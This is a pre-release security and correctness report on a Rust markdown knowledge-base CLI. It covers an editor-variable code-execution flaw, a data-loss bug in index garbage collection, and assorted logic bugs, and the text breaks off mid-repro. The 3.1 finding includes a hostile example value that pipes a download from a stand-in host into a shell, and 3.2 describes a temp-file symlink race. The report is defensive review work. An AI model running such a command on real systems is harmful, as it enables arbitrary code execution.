# kb — Security & Correctness Report

**Project:** kb — Verus-verified markdown knowledge base (Rust workspace: `kb-core` / `kb-db` / `kb`)
**Reviewer:** pre-release security pass
**Date:** 2026-10-06
**Verdict:** No remaining remote code execution after `edit` is gated out. Several medium-correctness bugs and one HIGH data-loss window need fixes before public release.

---

## 1. Executive summary

`kb` is a three-crate Rust workspace: a pure + Verus-verified core (`kb-core`), a SQLite/FTS5 shell (`kb-db`), and a single-binary CLI (`kb`). The stated threat model for this pass assumed the attacker has **only** the CLI and the files it reads, i.e. an external user driving the tool against their own (or a shared) corpus.

**One HIGH-severity arbitrary-code-execution vulnerability was found and reproduced:** `kb section edit` launches the value of `$VISUAL`/`$EDITOR` verbatim via `std::process::Command::new(...)`. Any environment that sets that variable to an attacker-chosen program (a dotfile, a CI runner, a library that wraps `kb`) becomes a code-exec context running as the invoking uid. **The agreed mitigation — compile-time disabling of the `edit` subcommand — removes this entirely**, because `run_editor` is the *only* non-test process spawn in the binary (the second `Command::new` at `main.rs:2787` is `#[cfg(test)]`). With `edit` gone, the next-largest exposures are a **HIGH data-loss window in `kb refresh`** (GC after a transient walk error) and a **MED case-sensitivity bug in tag search**.

The rest of the binary is in-process `std::fs` + `rusqlite` (all prepared statements — no SQL injection), and the remaining findings are correctness/robustness/logic bugs (silent no-ops, short-circuits, swallowed errors) and quadratic-scaling hotspots. None of them grant code execution. Rust's memory safety correctly caught no *memory* bugs across the surface I scanned — every finding I confirmed is a **logic** bug the borrow-checker is blind to.

| Severity | Count | IDs |
|----------|-------|-----|
| HIGH     | 2     | 3.1, 3.3 |
| MED      | 7     | 3.2, 3.4–3.9 |
| LOW      | 6     | 3.10–3.15 |
| LOW (perf) | 2   | 3.16, 3.17 |
| **Total** | **17** | |

**3.1 (RCE) is fixed by design decision (drop `edit`). 3.3 (GC) is the highest-priority *code* fix.**

---

## 2. Scope & method

- **In scope:** all of `kb-core/src`, `kb-db/src`, `kb/src`, the SQL/migration layer, and the CLI dispatch. Reviewed line-by-line against source (not the docs).
- **Assumed trusted (per threat model):** the Rust toolchain, the SQLite/`rusqlite` FFI, and the operator's own shell. The attacker's control surface is: argv, file contents they point `kb` at, the `--patch/--from-file/--import` payloads, and the environment *only insofar as it is read in-process*.
- **Method:** grep for `process::Command`, `env::var`, `format!`-into-SQL, `unsafe`/`transmute`, `File::create`/`rename`/`mktemp`, integer casts and `split('\n')` arithmetic, UTF-8 boundary handling, and transaction `BEGIN/COMMIT` pairing. Confirmed candidate findings by reading the actual code path (sub-agent exploration cross-checked against source).
- **Out of scope:** DoS by disk-full, network (none), and the Verus prover's own guarantees (treated as correct per the "proven vs assumed" split in `Cargo.toml`).

## 3. Findings

Each finding lists **Where** (file:line), the **impact**, the **trigger**, and a concrete **fix**. Severity is rated as HIGH / MED / LOW with respect to the stated threat model (attacker has the CLI and the files it reads).

**Findings index (number → summary).** The source-comment cross-refs throughout `kb-core` / `kb-db` / `kb` cite these numbers (e.g. `SECURITY_REPORT 3.17`); this table is the one place to resolve any of them.

| ID     | Severity     | Summary |
|--------|--------------|---------|
| [3.1](#31--high--rce-via-visualeditor-kb-section-edit--reproduced-7179) | HIGH | RCE via `$VISUAL`/`$EDITOR` (`kb section edit`) |
| [3.2](#32--med--predictable-editor-temp-file-no-o_excl--eliminated-by-31s-edit-removal) | MED | Predictable editor temp file, no `O_EXCL` |
| [3.3](#33--high--kb-refresh-gcs-pages-after-a-transient-walk-error--reproduced-76) | HIGH | `kb refresh` GCs pages after a transient walk error |
| [3.4](#34--med--tag-filter-is-case-sensitive-despite-case-insensitive-docs--reproduced-72) | MED | Tag filter is case-sensitive despite case-insensitive docs |
| [3.5](#35--med--not-only-search-is-a-silent-no-op--reproduced-73) | MED | NOT-only search is a silent no-op |
| [3.6](#36--med--typeslug-colon-ref-short-circuits-the-resolver--reproduced-74) | MED | `type:slug` colon ref short-circuits the resolver |
| [3.7](#37--med--non-utf-8-byte-makes-a-whole-files-frontmatter-un-editable--reproduced-75) | MED | Non-UTF-8 byte makes a whole file's frontmatter un-editable |
| [3.8](#38--med--tag-alias---import-leaves-a-transaction-open-on-error--code-confirmed-78) | MED | `tag-alias --import` leaves a transaction open on error |
| [3.9](#39--med--full_rebuild-swallows-per-page-errors-and-exits-0--reproduced-77) | MED | `full_rebuild` swallows per-page errors and exits 0 |
| [3.10](#310-low--extract_language-matches-languages-and-language_x) | LOW | `extract_language` matches `languages:` and `language_x:` |
| [3.11](#311-low--crlf-line-endings-dropped-on-one-frontmatter-rewrite-path) | LOW | CRLF line endings dropped on one frontmatter rewrite path |
| [3.12](#312-low--splice-capacity-can-underflow-in-release-build) | LOW | `splice` capacity can underflow in release build |
| [3.13](#313-low--insert-child-under-a-level-6-heading-lands-at-the-same-level) | LOW | Insert-Child under a level-6 heading lands at the same level |
| [3.14](#314-low--dbopen-memory--documented-but-errors) | LOW | `Db::open(":memory:")` documented but errors |
| [3.15](#315-low--schema_version--on-an-unmigrated-db-returns-err-not-none) | LOW | `schema_version()` on an unmigrated DB returns `Err`, not `None` |
| [3.16](#316-low-perf--quadratic--onm-scans-in-kb-core) | LOW (perf) | Quadratic / O(n·m) scans in `kb-core` |
| [3.17](#317-low-perf--per-iteration-sql-prep-in-kb-cli) | LOW (perf) | Per-iteration SQL prep in `kb` CLI |

### 3.1  HIGH — RCE via `$VISUAL`/`$EDITOR` (`kb section edit`) · **reproduced (§7.1/§7.9)**

**Status: to be eliminated at compile time (agreed).**

Where: `kb/src/main.rs:2600-2624` — `run_editor()` + `pick_editor()`, reached only from `cmd_section` → `SectionOp::Edit` (`main.rs:2342-2366`).

The CLI does:
```rust
let editor = pick_editor();                                  // $VISUAL ?? $EDITOR ?? "vi"
let st = std::process::Command::new(&editor)                 // main.rs:2604
    .arg(&tmp)
    .status()?;
```
`pick_editor` (`main.rs:2617-2624`) returns the *first whitespace-separated token* of `$VISUAL` (else `$EDITOR`), with no allow-list, no absolute-path check, and no `--` guard. That value is passed straight to `Command::new`, whose program argument is **executed**, not matched against a known binary.

Two distinct exploitations:
1. **Environment → arbitrary exec.** Setting `VISUAL=/path/attacker.sh` makes the CLI spawn an attacker-chosen program with the invoking user's rights. Reproduced in §7: my "editor" wrote a marker file and returned a body that the CLI then wrote back into the markdown.
2. **Silent argv truncation.** Because only the first token is used, `VISUAL="sh -c 'curl evil|sh'"` runs `sh` with the buffer as the only arg — still exec, still untrusted.

Why it matters pre-release: `kb` is meant to be invoked by other tools (the TUI, agents, CI scripts). Any of those that inherit a non-obvious `$VISUAL` turn a "read a markdown file" call into a code-exec with the operator's uid.

**Fix options (pick a posture):**
- **(Chosen) Compile-time `edit` removal.** Gate the whole `SectionOp::Edit` arm + `run_editor`/`pick_editor` behind an off-by-default `#[cfg(feature = "editor")]` (or delete). Zero runtime cost, zero env reads, zero spawns.
- **Alt A — allow-list.** After picking the binary, require `Path::new(&editor).is_absolute()` and that it lives under `/usr/bin`, `/usr/local/bin`, or `/opt`; else fall back to `vi` with a warning on stderr.
- **Alt B — quote and pass through.** Parse the env value into `[program, args…]` with a small shlex and call `Command::new(program).args(rest)` instead of `Command::new(joined)`.
- **Alt C — opt-in flag.** Require an explicit `--editor <path>` (absolute) to run any non-default program; never trust the env otherwise.

---

### 3.2  MED — Predictable editor temp file, no `O_EXCL` · **eliminated by 3.1's `edit` removal**

**Status: eliminated at compile time together with 3.1 (it only exists to serve the editor flow).**

Where: `kb/src/main.rs:2601-2614`.
```rust
let tmp = std::env::temp_dir().join(format!("kb-edit-{}.md", std::process::id()));
std::fs::write(&tmp, initial)?;     // create-or-truncate, NOT O_EXCL
```
The path is `kb-edit-<pid>.md` in the default temp dir (`/tmp` by default — `drwxrwxrwt`, world-writable). `std::fs::write` truncates an existing file rather than failing, so a local unprivileged user who can seed `/tmp` can:
- **Symlink-race** the create and have `kb` truncate/overwrite a file of their choice (a victim's shell rc, a token file), or
- **Pre-place** the buffer so the *editor* loads attacker content as the "current" section.

Combined with 3.1 (the editor runs with the user's identity and receives this exact path as `$1`) it compounds: the attacker both picks the buffer and observes a world-visible temp file they can pre-load.

**Fix:** build the buffer in a `kb`-created `0700` dir (or `<tmp>/kb-edit-<pid>-<rand>`), create it with `File::create_new` (O_EXCL) at mode `0600`, and `unlink` in a `Drop` so a crash between write and read doesn't leave stale bytes. Pass `--` before the filename to the editor as defense-in-depth.

---
### 3.3  HIGH — `kb refresh` GCs pages after a transient walk error · **reproduced (§7.6)**

Where: `kb-db/src/refresh.rs:93-105` (`candidate_files`) feeding `gc_orphaned_pages` (`refresh.rs:207-234`).

`candidate_files` unions the walked files of **every** registered root, but for a root whose `build_walk` returns `Err`, it does `continue`:
```rust
let walk = match walk_snapshot::build_walk(root, r.extra_exts.clone()) {
    Ok(w) => w,
    Err(_) => continue,   // refresh.rs:99
};
```
Those roots' files are therefore **absent from `candidates`**. The GC step keys off exactly that set: any `pages.abs_path` not in `candidates` is treated as orphaned and `DELETE`d — **even though the files are still on disk**. So a momentary `EACCES`, `ENOTEMPTY`, or symlink loop on one root silently deletes that root's index rows. It self-heals only on the *next* successful refresh — precisely the command a confused user will re-run, which re-walks and re-indexes, masking the loss in the meantime.

**Impact:** transient FS hiccup ⇒ permanent until next index ⇒ silent partial-index loss. This is the highest-priority *code* fix (no design change required).

**Trigger:** `kb refresh` (or `full-rebuild`) while any root is briefly unreadable: permissions flip, a file is mid-`rename`, a network mount is flapping, a `.git`-like deep symlink tree trips the walker.

**Fix:**
- Track per-root walk success. Union only successful roots into `candidates` **and** gate the GC on `all_roots_walked_ok`. If any root failed, either (a) skip GC this run, or (b) limit the GC to *only* the roots that walked cleanly.
- Simplest correct form: `candidate_files` returns `Result<BTreeSet<String>, Vec<String>>` (the erroring roots); `refresh`/`full_rebuild` propagate `Err` *or* delete only pages whose root is in the successfully-walked set.
- Also distinguish "root genuinely removed" (`drop-root` already handles that) from "root temporarily unreadable" so the latter never reaches the GC.

---

### 3.4  MED — Tag filter is case-sensitive despite case-insensitive docs · **reproduced (§7.2)**

Where: `kb/src/main.rs:842-851` (the `IN` clause) × `kb-core/src/tags.rs:107-120` (`canonicalize` returns stored case) × `kb-core/src/tags.rs:81-82` (the doc example is exactly the case that then fails).

```rust
// main.rs:847-849
wheres.push(format!(
    "EXISTS (SELECT 1 FROM page_tags pt WHERE pt.abs_path = pages.abs_path
     AND lower(pt.tag) IN ({}))", in_list.join(",")   // in_list = STORED case
));
```
`in_list` is built from `kbtags::canonicalize`, which pushes **`s.as_str()` — the stored tag with its original casing** (`tags.rs:119`). The SQL left side is `lower(pt.tag)`, so the comparison is `lower('Czech') IN ('Czech','czechia')` → `'czech' IN ('Czech',…)` → **no match**. The library's own doc example (`stored=["Czech","czechia","llm"]`, query `"czech"` → `["Czech","czechia"]`, `tags.rs:81-82`) is precisely the data that drops out of the SQL result.

Note this is a **correctness** bug, not injection: the value comes from our own `canonicalize`, and the only `format!`-into-SQL site is this `IN` list plus a numerically-derived `LIMIT`. Quotes *are* doubled (`replace('\'','''')`).

**Impact:** `tag:Czech` (or any not-already-lowercase stored tag) returns fewer rows than it should, and the *documented* case-insensitive matching is silently broken.

**Fix:** lowercase the `IN`-list values uniformly (`t.to_lowercase()` in the `map` at `main.rs:845`), or drop the left-side `lower()`. Either way, both sides of `IN` must be the same case-fold.

---

### 3.5  MED — NOT-only search is a silent no-op · **reproduced (§7.3)**

Where: `kb/src/main.rs:870-872`.
```rust
if !has_match && has_not {
    println!("note: NOT-only queries use a full scan (no FTS match) — v1");
}
```
When the query has **only** NOT terms (e.g. `kb search -gpt`), `has_match` is false so `fts_active` is false, and — critically — **no NOT predicate is ever added to `wheres`**. The "column-exclusion fallback" promised by both the comment here and the grammar spec (`kb-core/src/search_grammar.rs:163-167`) *does not exist*. The query degrades to `SELECT … FROM pages WHERE <gate predicates only>` and returns the whole corpus up to `LIMIT`.

**Impact:** `-gpt` alone is a silent do-nothing that returns up to `limit` pages with a reassuring note on stderr. Bad for an agent consuming `--json` (the note is a human string, the row list is just "everything").

**Fix:** implement the promised exclusion — either `NOT EXISTS (SELECT 1 FROM page_gates g WHERE g.abs_path = pages.abs_path AND lower(g.term) LIKE '%'||?||'%')` per NOT term, or emit a proper FTS `NOT` clause when a positive term is present; if truly unsupported, return `Err(("NOT-only queries require a positive term", EXIT_SECTION))` instead of a `println`.

---

### 3.6  MED — `type:slug` colon ref short-circuits the resolver · **reproduced (§7.4)**

Where: `kb-core/src/resolve.rs:156-165`, helper `split_type_slug` at `resolve.rs:106-111`.
```rust
if let Some((typ, slug)) = split_type_slug(query) {
    let hits = pages.iter().filter(|p| …).collect();
    return finish(hits);          // returns EVEN IF hits.is_empty()
}
```
`split_type_slug` returns `Some` for **any** query with a `:` and non-empty both sides (`p>0 && p+1<len`). Stage 1 then `return`s **unconditionally**, so when the `(type,slug)` match set is empty, stages 2 (bare slug), 3 (path), and 4 (substring) are never reached and the result is `Resolution::Empty` — even though a later stage would have found the page.

**Impact:** resolving `"note:/some/page.md"`, a path ref containing a colon, or a Windows-style `C:` token silently returns "not found" despite the page being reachable by path/substring at stage 3/4.

**Fix:**
```rust
if let Some((typ, slug)) = split_type_slug(query) {
    let hits = …;
    if !hits.is_empty() { return finish(hits); }
}
// fall through to stage 2
```

---

### 3.7  MED — Non-UTF-8 byte makes a whole file's frontmatter un-editable · **reproduced (§7.5)**

Where: `kb-core/src/frontmatter.rs:487` (`lines_of`), repeated at :795, :811, :825.
```rust
let s = std::str::from_utf8(data).unwrap_or("");     // 487
```
The doc comment above `lines_of` (`:475-482`) explicitly promises `from_utf8_lossy` ("char-aware… total… lossy yields U+FFFD"). The code instead uses `from_utf8` + `unwrap_or("")`. A single invalid UTF-8 byte anywhere in the file makes `from_utf8` fail, the `unwrap_or("")` swallows it, `lines_of` returns an **empty** `Vec`, and `find_fm`/`locate_key_line`/`scalar_rewrite`/the list rewrites all report `NoFrontmatter`. A file with a perfectly valid frontmatter frame becomes un-editable until the bad byte is scrubbed by hand.

**Trigger:** `kb section set/append/fm …` on any file containing one invalid byte (a CP1252 char pasted in, a mis-decoded file, a binary fragment).

**Impact:** silent no-op or "NoFrontmatter" error on otherwise-valid files; in the worst case a rewrite path that assumes a frame is present can write a fresh one, clobbering structure.

**Fix:** replace `std::str::from_utf8(data).unwrap_or("")` with `std::str::from_utf8_lossy(data)` at all four sites, matching the (correct) doc.

---

### 3.8  MED — `tag-alias --import` leaves a transaction open on error · **code-confirmed (§7.8)**

Where: `kb/src/main.rs:1427-1443`.
```rust
db.conn.execute_batch("BEGIN")?;
let mut upsert = db.conn.prepare("INSERT … ON CONFLICT …")?;
for (a, c) in &rows {
    upsert.execute(params![a, c])?;   // a failure here returns Err, NO ROLLBACK
}
db.conn.execute_batch("COMMIT")?;
```
If any `execute` (or the `prepare`) returns `Err`, the function returns without issuing `ROLLBACK`. `rusqlite::Connection` reuses the still-open transaction, so the **next** command on the same `Db` sees uncommitted state, and a process death in that window loses the batch. The `BEGIN` at :1427 can also succeed while the `prepare` at :1433 fails — same leak.

**Fix:** use a checked transaction so `Drop` rolls back:
```rust
let tx = db.conn.transaction()?;           // or unchecked_transaction() for the inner rows
for (a, c) in &rows { tx.execute("INSERT …", params![a, c])?; }
tx.commit()?;
```
(or wrap each fallible step in a `match` and `execute_batch("ROLLBACK")` on `Err`).

---

### 3.9  MED — `full_rebuild` swallows per-page errors and exits 0 · **reproduced (§7.7)**

Where: `kb-db/src/refresh.rs:275-279` (per the integration path), surfacing as `cmd_refresh` / `cmd_full_rebuild` in the CLI.

`full_rebuild` catches per-page upsert/index errors via `eprintln!` and continues, then returns `Ok(summ.finish())`. A partial wipe + partial re-index (any one file unreadable mid-run) therefore **exits 0** and leaves a *thinner* corpus than before the wipe — and the CLI reports success. `cmd_refresh` (`main.rs:728`) and `cmd_full_rebuild` inherit this.

**Impact:** silent partial success. A user (or agent) running `full-rebuild` after a "not found" gets no error and a smaller index.

**Fix:** collect per-page errors; if any, return `Err` (or a summary the CLI maps to a non-zero exit). At minimum, surface `n_errors > 0` in the JSON so a programmatic caller can detect it.

---

### 3.10 LOW — `extract_language` matches `languages:` and `language_x:`

Where: `kb-db/src/index.rs:123-148`.
```rust
let rest = match t.strip_prefix("language") { Some(r) => r, None => continue };
let rest = rest.trim_start();
let rest = match rest.strip_prefix(':') { Some(v) => v.trim_start(), None => continue };
```
The prefix is matched with no key-boundary check, so `languages: en, fr` (or `language_x: …`) yields `language = "en, fr"` and pollutes the `language:` filter column (`search_grammar::FILTER_KEYS`).

**Fix:** require the character after `language` to be `:` (after optional whitespace), i.e. check `t` starts with `language:` or `language :`.

---

### 3.11 LOW — CRLF line endings dropped on one frontmatter rewrite path

Where: `kb-core/src/frontmatter.rs:818, 836, 889, 942` (the `let nl = if line.ends_with('\n') { "\n" } else { "" }` family).

The rewrite helpers rebuild the edited line as `format!("{leading}{key} {value}{nl}")`. On a CRLF file the line ends with `\r\n`, so `nl` is `"\n"` and the trailing `\r` is silently dropped — leaving that one line LF-terminated among CRLF neighbours. Mixed endings confuse `git diff` and any byte-offset consumer downstream.

**Fix:** detect the original terminator, e.g. `let nl = if line.ends_with("\r\n") { "\r\n" } else if line.ends_with('\n') { "\n" } else { "" };`.

---

### 3.12 LOW — `splice` capacity can underflow in release build

Where: `kb-core/src/section.rs:518-520`.
```rust
pub fn splice(data: &[u8], lo: usize, hi: usize, new: &[u8]) -> Vec<u8> {
    debug_assert!(lo <= hi && hi <= data.len(), "splice range out of bounds");
    let mut out = Vec::with_capacity(data.len() + new.len() - (hi - lo));  // 520
```
The range invariant is guarded only by `debug_assert!`. In a **release** build a caller passing `lo > hi` makes `(hi - lo)` underflow to a huge `usize`, and `Vec::with_capacity` panics. All four current call sites pass `lo ≤ hi`, so this is latent — but `splice` is `pub` and the TUI/future callers rely on it.

**Fix:** `data.len().saturating_add(new.len()).saturating_sub(hi.saturating_sub(lo))`, or `checked_sub` + an early `Err`.

---

### 3.13 LOW — Insert-Child under a level-6 heading lands at the same level

Where: `kb-core/src/section.rs:345, 349`.
```rust
(SectionPlacement::Child, Some(i)) => self.sections[i].level + 1,   // 345
…
base.min(6)                                                         // 349
```
On a level-6 target, the child level is `7 → min(6) → 6` — so the "child" is inserted at the **same level as its parent** (a silent sibling), with no error or warning.

**Fix:** return an error (`"cannot insert a child of a level-6 heading"`) instead of clamping.

---

### 3.14 LOW — `Db::open(":memory:")` documented but errors

Where: `kb-db/src/lib.rs:40-46`.
```rust
/// `:memory:` is a valid path — we use it in tests …
pub fn open(path: &Path) -> Result<Self> {
    let conn = Connection::open(path)?;
    conn.pragma_update(None, "journal_mode", "WAL")?;   // on :memory: returns "memory", rusqlite checks the value → Err
```
On an in-memory DB, `PRAGMA journal_mode=WAL` returns `"memory"` (not `"WAL"`), `rusqlite` verifies the returned value, and the call fails. The team already works around this with a temp-file-backed `open_in_memory_test` (`lib.rs:64-78`), which is the right instinct — but the `open` doc over-promises.

**Fix:** special-case `:memory:` (skip the WAL pragma) or fix the doc to point callers to `open_in_memory_test`.

---

### 3.15 LOW — `schema_version()` on an unmigrated DB returns `Err`, not `None`

Where: `kb-db/src/lib.rs:169`. The doc says it returns `None` if the DB is unmigrated, but an unmigrated DB has no `meta` table, so `query_row` fails with `SqliteFailure` (not `QueryReturnedNoRows`) and `.optional()?` propagates `Err`.

**Fix:** treat a "no such table" failure as `None`, or `SELECT … FROM pragma_table_list WHERE name='meta'` first.

---

### 3.16 LOW (perf) — Quadratic / O(n·m) scans in `kb-core`

All CLI-reachable; fine at small corpus, painful at 10k+ pages/files.
- `kb-core/src/tags.rs:56,117` — `normalize`/`canonicalize` dedupe with `seen.iter().any(…)` (O(n²)); `canonical_of` re-scans the alias table per stored tag (O(T·A)).
- `kb-core/src/links.rs:185` — link dedupe `seen.iter().any(|(t,s)| …)` (O(L²)) on hub/index pages with many outgoing links.
- `kb-core/src/aliases.rs:147` — `from_text` `rows.iter_mut().find(…)` per input line (O(R²)) for large alias files.
- `kb-core/src/resolve.rs:129` — `path_matches` allocates two `String`s (`format!("/{}", q)`) **per page** inside the stage-3 filter (N pages → 2N allocations per path query).
- `kb/src/diff.rs:75-78` — `opcodes` builds an O(n·m) LCS DP table with no size guard; a multi-MB patch on a multi-MB file allocates `n×m×4` bytes.

**Fixes (general):** replace the linear-scan dedupe with a `BTreeSet`/`BTreeMap` key; hoist the `format!("/{}", q)` out of the closure (build it once per query); add a size cap / early-bail to the LCS before `split('\n')`.

---

### 3.17 LOW (perf) — Per-iteration SQL prep in `kb` CLI

- `kb/src/main.rs:786-820` — for **each** `tag:` filter the code re-`prepare()`s and fully collects `tag_aliases` **and** `DISTINCT tag FROM page_tags`. N tag filters → N full table scans of the same data. **Fix:** hoist both loads before the filter loop.
- `kb/src/main.rs:1600-1626` — `cmd_links` backlink loop calls `db.conn.prepare("SELECT to_path FROM links WHERE from_path = ?1")` **inside** `for (from_abs,_) in corpus_pages.iter()`. O(N) `prepare()` + N `query_map()` over a table that should be one prepared statement. 10k corpus → 10k prepares. **Fix:** load all forward edges into a `BTreeMap<String, Vec<String>>` once; iterate in memory.

## 4. What is safe (verified non-issues)

These were specifically checked so the team doesn't re-litigate them:

- **No SQL injection.** Every `kb-db` write/read uses `params!` + `prepare`/`prepare_cached` with bind markers (`?1`, `?2`). The only `format!`-into-SQL sites are the tag `IN` list (3.4 — a *case* bug, not injection, since the value comes from our own `canonicalize` and single-quotes are doubled) and `LIMIT {limit}` (a `usize`, not user text).
- **No `unsafe` / `transmute`** in any of the three crates' `src/`. The FFI boundary is entirely inside `rusqlite`.
- **FTS5 external-content triggers** (`kb-db/src/migrate.rs`) use the correct `('delete', old.rowid, old.title, old.description, old.body)` idiom; column values match verbatim (TEXT columns stored verbatim). Classic FTS5 trap, correctly handled.
- **Thread safety.** `Db.conn` is a plain `pub Connection`; all `cmd_*` paths are single-threaded, so the absence of `Arc<Mutex<…>>` is by design, not a race.
- **Cron output quoting** (`kb src/main.rs:2030`, `shell_quote`) single-quotes and `''`-escapes non-alphanumerics before *printing* the crontab line. `kb cron` does not exec — it prints. Correct for its purpose.
- **`etag_of` FNV-1a 64** is used consistently across `kb-core`, `kb-db`, and the CLI (same value everywhere). It's not cryptographic, but it's used as *optimistic concurrency*, not access control — acceptable for the documented contract.
- **Atomic writes** (`kb src/main.rs:2649-2666`) are same-directory temp + `rename` — correct POSIX atomicity, unlike the editor temp file in 3.2.
- **The `meta.rs` `unwrap`s** are `#[cfg(test)]`-only, not CLI-reachable. `frontmatter.rs:814`/`828` `.expect`/`.unwrap_or` sites are guarded by caller invariants.

---

## 5. Prioritised fix plan

Ordered by (impact × ease-of-trigger ÷ effort). None touch the RCE after 3.1's compile-time removal.

| # | ID | Fix | Effort |
|---|----|-----|--------|
| 0 | 3.1 | Compile-time `edit` removal (gates 3.1 + 3.2) | S |
| 1 | 3.3 | Gate GC on per-root walk success (return `Err` / skip GC on walk failure) | S |
| 2 | 3.4 | Lowercase the tag `IN`-list values (or drop the left-side `lower()`) | S |
| 3 | 3.5 | Implement NOT column-exclusion **or** return a proper error | S-M |
| 4 | 3.7 | `from_utf8` → `from_utf8_lossy` at the 4 sites | XS |
| 5 | 3.6 | `if !hits.is_empty() { return }` in resolver stage 1 | XS |
| 6 | 3.8 | Replace `BEGIN/COMMIT` with a checked transaction (Drop-rollback) | S |
| 7 | 3.9 | Propagate per-page errors from `full_rebuild` / surface in JSON | S |
| 8 | 3.10 / 3.13 | Key-boundary check; error on level-6 child | XS |
| 9 | 3.11 | Preserve `\r\n` on frontmatter rewrite | XS |
| 10 | 3.12 | `saturating_sub` for `splice` capacity | XS |
| 11 | 3.14 / 3.15 | `:memory:` special-case; `schema_version` `None` on missing table | XS |
| 12 | 3.16 / 3.17 | `BTreeSet`/`BTreeMap` dedupe; hoist loop-invariant SQL prep; LCS size cap | M |

**Suggested PR split:** (a) drop `edit` — one focused commit; (b) data-integrity (3.3, 3.8, 3.9); (c) search/resolve correctness (3.4, 3.5, 3.6); (d) core robustness (3.7, 3.10, 3.11, 3.12, 3.13); (e) perf hardening (3.16, 3.17). Each is independently testable and low-risk.

---

## 6. Reviewer's assessment of the codebase

**Design strengths — this is above-average for a project this size, and it shows the team cares:**

1. **The "proven vs assumed" split is the single best design decision here.** Isolating the pure, Verus-checked logic (`kb-core`) from the FFI/IO shells (`kb-db`, `kb`) makes the trust boundary *visible in the crate graph*, and it is exactly why the RCE surfaced cleanly in one place (`kb`, the "assumed" shell) rather than being smeared across the "proven" core. That's rare discipline.
2. **The agent/CLI contract is explicit and pinned by tests** (exit codes 0/1/2/3, the 3-source text model, "diff is output not input," JSON-on-stdout / notes-on-stderr). It's testable, it's documented in both code and `PLAN.md`, and the JSON round-trip is *byte-pinned* against `python3 json.loads`. Few projects this small have that level of contract hygiene.
3. **Zero-dependency core for the hard parts** (`diff`, `frontmatter`, `section`) keeps the binary a single static blob and shrinks the supply chain. The FTS5/SQLite choices are the right ones.
4. **Consistent invariants** (the `FmError`/`Resolution`/`Kb` `Result<_, (String, i32)>` pattern, the `splice`/`Doc` total functions, the "guarded by caller" comments) make the logic easy to reason about — which is precisely what let the bugs above be *found* by reading instead of fuzzing.

**Where the quality drops — and the pattern behind it:**

1. **Docs and code drift.** Several findings are *doc says X, code does Y*: `lines_of` promises `from_utf8_lossy` (3.7), `Db::open` promises `:memory:` works (3.14), `schema_version` promises `None` (3.15), the NOT-only comment promises a fallback (3.5). The team writes careful doc comments and then the code diverges. That's a *process* gap — the docs are a feature here (they're the spec), so a doc-assertion test or a lint would catch the drift.
2. **`unwrap_or("default")` is used as control flow.** 3.7 (`from_utf8(...).unwrap_or("")`) and 3.9 (swallow-and-continue) are the same habit: "the error is unexpected, so absorb it." In a DB/search tool the unexpected case is a *user-visible* failure, not a no-op. Prefer `Result` + an explicit branch; the `Kb` type already makes that ergonomic.
3. **Loops re-do constant work.** 3.16/3.17 (per-iteration SQL prep, O(n²) dedupe, per-page allocations) are the tell of "works, didn't bench." Not a correctness problem, but it will bite at the corpus sizes a knowledge base will actually hit.
4. **The editor flow is the one place that mixes an "assumed shell" concern (process spawn, temp file, env) into what is otherwise a clean in-process binary.** It's not a surprise it's also the one place with the HIGH finding — it simply shouldn't be allowed to touch a subprocess. Removing it (as decided) removes the category, not just one instance. Good instinct.
5. **Test coverage is strong on the happy/edge paths but thin on *failure* paths** (walk error during GC, mid-import error, non-UTF-8 input, partial rebuild). The data-loss and most of the correctness findings (3.3, 3.5, 3.8, 3.9) all live in error branches that a green test suite never exercises. Recommend fault-injection tests: force `build_walk` to fail on one root and assert the other roots' pages survive; force one upsert to fail mid-`import` and assert the connection is not left in a transaction.

**Net:** a well-architected, well-intended codebase with a handful of genuine logic bugs concentrated in *error handling* and *case/UTF-8 boundaries* — not in the core invariants they set out to prove. The architecture is doing its job: the one HIGH exec vulnerability is localised to a single removable function, and the remaining issues are each a one- or two-line fix. Shipping is realistic after items 0–6 above.

---

## 7. Evidence log (reproduced against `release` build)

The following were **executed and observed**, not just code-read, on `kb` v0.0.0 as of this commit. Each is a short repro that would pass as a regression test.

### 7.1  3.1 RCE — reproduced
Reproduced earlier this session (marker file `pwned-jakub` created by the attacker-chosen "editor"). Full script + observed output in §7.9.

### 7.2  3.4  mixed-case stored tag is dropped from the tag filter — reproduced
Setup: `budapest.md` stores `tags: [Czech, llm]` — one mixed-case tag, one lowercase tag.
```
$ kb search tag:llm      # stored tag is lowercase → works
  1  note:Budapest            Budapest  notes/budapest.md
── 1 result(s)
$ kb search tag:Czech    # stored tag is mixed-case → BUG: 0 rows
0 results for "tag:Czech" (the query was too strict, or the page is gated)
$ kb search tag:czech    # bug also hits the lowercase form
0 results for "tag:czech" (the query was too strict, or the page is gated)
```
Root cause confirmed: `lower(pt.tag) IN ('Czech', 'czechia', …)` — the IN-list keeps the stored casing.

### 7.3  3.5  NOT-only query is a silent no-op — reproduced
Setup: three pages, two (`gate_gpt`, `slug_gpt`) actually contain the token `gpt`.
```
$ kb search -- -gpt
note: NOT-only queries use a full scan (no FTS match) — v1
  1  note:Budapest            Budapest  notes/budapest.md
  2  note:Gate GPT            Gate GPT  notes/gate_gpt.md       ← should be EXCLUDED
  3  note:gpt                 gpt      notes/slug_gpt.md        ← should be EXCLUDED
── 3 result(s)

$ kb search -- gpt          # positive control: 2 matches
  1  note:gpt                 gpt      notes/slug_gpt.md
  2  note:Gate GPT            Gate GPT  notes/gate_gpt.md
── 2 result(s)
```
`-gpt` alone returns *everything up to `limit`* — the NOT clause never reaches the SQL.

### 7.4  3.6  colon ref short-circuits the resolver — reproduced
Setup: one page has slug `gpt`.
```
$ kb resolve gpt
  1  note:gpt   note   gpt  /…/corpus/notes/slug_gpt.md   [resolved to abs_path]

$ kb resolve note2:gpt             # type `note2` doesn't exist — should fall through
no page matches "note2:gpt"      ← stages 2/3/4 never reached
```

### 7.5  3.7  non-UTF-8 byte makes a whole file's frontmatter un-editable — reproduced
Fixture (byte `0x92` in body; frontmatter is perfectly well-formed):
```
$ od -An -tx1 nonutf8.md | grep -o 92 | head -1            # byte present
92
$ python3 -c "open('nonutf8.md','rb').read().decode('utf-8')"
UnicodeDecodeError: 'utf-8' codec can't decode byte 0x92 in position 53

$ kb section set fm.title --text NEWTITLE    # valid-UTF-8 control file
kb: aborted (not confirmed)                 # reached the write step → OK

$ kb section set fm.title --text NEWTITLE    # same op on the non-UTF-8 file
kb: file has no frontmatter block (add one first)     ← frontmatter frame silently disappeared
```

### 7.6  3.3  refresh GCs pages after a transient walk error — reproduced
Two roots, both freshly indexed. One root is then made unreadable (simulating a transient FS error).
```
$ kb add two/rootA && kb add two/rootB
… · 2 page(s) indexed …
